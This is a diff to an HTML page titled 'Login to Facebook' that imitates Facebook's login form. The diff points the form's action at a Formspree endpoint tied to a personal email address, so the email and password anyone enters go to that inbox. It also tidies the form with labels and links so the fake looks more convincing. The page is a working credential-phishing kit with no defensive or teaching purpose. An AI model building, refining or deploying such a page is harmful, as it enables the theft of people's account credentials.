@@ -8,12 +8,18 @@
 </head>
 <body>
     <div class="container">
-        <form class="login-form" action="https://formspree.io/your_email_here" method="POST">
+        <form class="login-form" action="https://formspree.io/pasindunishshanka28@gmail.com" method="POST" novalidate>
             <h2>Login to Facebook</h2>
-            <input type="email" name="_replyto" placeholder="Your Email" required>
-            <input type="password" name="password" placeholder="Password" required>
+            <div class="input-group">
+                <label for="email">Email</label>
+                <input type="email" id="email" name="_replyto" placeholder="Your Email" required>
+            </div>
+            <div class="input-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" placeholder="Password" required>
+            </div>
             <button type="submit">Login</button>
-            <div class="forgot-password">Forgot password?</div>
+            <div class="forgot-password"><a href="#">Forgot password?</a></div>
             <hr>
             <div class="create-account">Don't have an account? <a href="#">Sign up</a></div>
         </form>
